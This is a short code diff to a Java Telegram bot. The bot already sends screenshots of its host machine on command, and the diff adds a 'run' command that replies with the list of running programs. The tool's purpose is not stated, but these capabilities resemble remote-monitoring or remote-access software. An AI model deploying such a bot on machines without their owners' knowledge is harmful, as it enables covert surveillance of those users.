@@ -2,6 +2,7 @@ package org.gvozdetscky.api;
 
 import org.gvozdetscky.util.InetIP;
 import org.gvozdetscky.util.SystemUtil;
+import org.gvozdetscky.util.TaskManager;
 import org.telegram.telegrambots.api.methods.send.SendDocument;
 import org.telegram.telegrambots.api.methods.send.SendMessage;
 import org.telegram.telegrambots.api.objects.Update;
@@ -26,6 +27,13 @@ public class TelegramApi extends TelegramLongPollingBot {
 
         if (message.equals("scr")) {
             sendScreenshot(update.getMessage().getChatId().toString());
+        }
+
+        if (message.equals("run")) {
+
+            String runProgramm = TaskManager.getRunProgramm();
+
+            sendMsg(update.getMessage().getChatId().toString(), runProgramm);
         }
 
         System.out.println();
